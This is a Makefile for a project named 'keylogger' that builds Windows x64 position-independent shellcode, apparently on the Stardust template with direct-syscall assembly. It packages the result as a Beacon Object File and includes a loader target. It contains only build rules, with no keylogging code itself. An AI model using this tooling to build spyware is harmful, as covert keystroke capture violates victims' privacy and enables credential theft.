MAKEFLAGS += "-s -j 16"

##
## Project name
##
Project := keylogger

##
## Compilers
##
CC_X64	:= x86_64-w64-mingw32-g++

##
## defines
##
#DEFINES := -DIMPERIUM_DEBUG

##
## Compiler flags
##
CFLAGS          := -Os -fno-asynchronous-unwind-tables
CFLAGS          += -fno-ident -fpack-struct=8 -falign-functions=1
CFLAGS          += -s -ffunction-sections -falign-jumps=1 -w
CFLAGS          += -falign-labels=1 -fPIC
CFLAGS          += -Wl,-s,--no-seh,--enable-stdcall-fixup
CFLAGS          += -Ishellcode/include -masm=intel -fpermissive -mrdrnd -std=c++20 ${DEFINES}

SHELLCODE_FLAGS := -nostdlib -Wl,-Tscripts/Linker.ld -DIMPERIUM_SHELLCODE

##
## Stardust source and object files
##
STAR-SRC := $(wildcard shellcode/src/*.cc)
STAR-OBJ := $(STAR-SRC:%.cc=%.o)

##
## x64 binaries
##
EXE-X64	:= bin/$(Project).x64.exe
BIN-X64	:= bin/$(Project).x64.bin
BOF-X64	:= bin/$(Project).x64.o

##
## main target
##
all: bof

exe: clean asm-x64
	@ echo "[+] compile x64 exe"
	@ $(CC_X64) $(STAR-SRC) bin/obj/asm_Syscall.x64.o -o $(EXE-X64) $(CFLAGS)

bof: clean shellcode
	@ echo "[+] convert shellcode to C array"
	@ scripts/shellcode_to_byte_array.py -f $(BIN-X64) > bin/shellcode.c
	@ echo "[+] compile x64 bof"
	@ x86_64-w64-mingw32-gcc -Os -Ibof/include -c -w bof/src/Bof.c -o $(BOF-X64)

##
## Build stardust source into an
## executable and extract shellcode
##
shellcode: clean asm-x64 $(STAR-OBJ)
	@ echo "[+] compile x64 shellcode"
	@ $(CC_X64) bin/obj/*.x64.o -o $(EXE-X64) $(CFLAGS) $(SHELLCODE_FLAGS)
	@ python3 scripts/build.py -f $(EXE-X64) -o $(BIN-X64)
	@ rm $(EXE-X64)

##
## Build source to object files
##
$(STAR-OBJ):
	@ $(CC_X64) -o bin/obj/$(Project)_$(basename $(notdir $@)).x64.o -c $(basename $@).cc $(CFLAGS) $(SHELLCODE_FLAGS)

##
## Build assemlby source to object files
##
asm-x64:
	@ echo "[*] compile assembly files"
	@ nasm -f win64 shellcode/src/asm/x64/Stardust.asm -o bin/obj/asm_Stardust.x64.o
	@ nasm -f win64 shellcode/src/asm/x64/Syscall.asm -o bin/obj/asm_Syscall.x64.o

##
## build the loader
##
loader:
	@ echo "[*] compiling loader"
	@ x86_64-w64-mingw32-gcc scripts/loader.c -o scripts/loader.x64.exe

##
## Clean object files and other binaries
##
clean:
	@ rm -rf bin/obj/*.o bin/*.bin bin/*.exe bin/*.c
